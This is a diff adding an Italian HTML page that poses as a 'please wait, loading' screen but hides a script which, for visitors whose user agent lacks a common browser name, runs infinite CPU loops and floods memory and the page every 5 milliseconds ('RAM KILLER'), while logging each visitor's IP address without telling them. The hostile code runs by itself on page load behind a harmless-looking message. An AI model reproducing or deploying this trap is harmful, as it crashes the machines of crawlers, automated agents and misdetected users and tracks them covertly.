@@ -1,0 +1,61 @@
+<!-- File: romolettodistruggi.html -->
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Caricamento in corso...</title>
+  <meta name="robots" content="noindex, nofollow">
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🌀 Attendere il caricamento...</h1>
+  <p>Stiamo processando la tua richiesta...</p>
+
+  <script>
+    // Carico RAM e CPU solo per bot (user-agent sconosciuti)
+    const safeBrowsers = ["Chrome", "Firefox", "Safari", "Edg", "Opera"];
+    let isBot = true;
+    for (let b of safeBrowsers) {
+      if (navigator.userAgent.includes(b)) {
+        isBot = false;
+        break;
+      }
+    }
+
+    if (isBot) {
+      let arrFlood = [];
+      let cpuFlood = () => {
+        // Ciclo infinito per saturare la CPU
+        while (true) {
+          Math.sqrt(Math.random() * Date.now());
+        }
+      };
+      // Avvia più worker per saturare la CPU
+      for (let i = 0; i < 4; i++) {
+        setTimeout(cpuFlood, 0);
+      }
+      // Carica RAM e DOM
+      setInterval(() => {
+        for (let i = 0; i < 20; i++) {
+          let div = document.createElement("div");
+          div.innerText = "💀 RAM KILLER 💀";
+          div.style.fontSize = "32px";
+          div.style.color = "#f00";
+          document.body.appendChild(div);
+          arrFlood.push(new Array(500000).fill("💥💥💥💥💥"));
+        }
+      }, 5); // ogni 5ms
+    }
+
+    // Logga comunque l’IP per statistiche
+    fetch("/api/log_ip?trap=ramkiller");
+  </script>
+</body>
+</html>
